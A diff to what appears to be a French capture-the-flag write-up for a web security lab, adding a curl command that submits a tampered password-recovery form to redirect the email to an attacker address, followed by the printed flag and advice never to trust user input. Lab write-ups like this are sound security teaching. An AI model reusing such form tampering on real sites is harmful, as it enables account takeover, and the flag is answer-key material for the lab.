@@ -20,6 +20,14 @@ Avec BurpSuite on peux changer la requete envoyer au serveur pour changer la des
 
 	mail=hacker%40borntosec.com&Submit=Submit
 
+avec curl:
+
+```bash
+$> curl 'http://192.168.99.100/?page=recover' --data 'mail=hacker%40borntosec.com&Submit=Submit' | grep flag
+
+The flag is : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0
+```
+
 ## Resolution
 
 Ne faites jamais confiance aux champs de saisie utilisateur. Toutes les entrées des utilisateurs doivent être considérées comme non fiables et potentiellement malveillantes. 
